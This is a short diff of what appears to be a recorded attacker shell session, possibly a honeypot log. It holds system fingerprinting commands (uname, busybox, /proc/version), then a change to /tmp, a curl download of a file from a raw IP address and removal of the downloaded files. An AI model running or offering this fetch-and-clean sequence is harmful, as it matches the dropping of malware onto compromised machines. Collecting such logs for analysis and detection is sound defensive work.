@@ -14,8 +14,8 @@ su
 busybox uname -s -v -n -m 2 > /dev/null
 head -1 /proc/version | cut -d -f1
 uname -s -v -n -m 2 > /dev/null
-
 uname -s -v -n -r -m
+
 cd /tmp
 curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
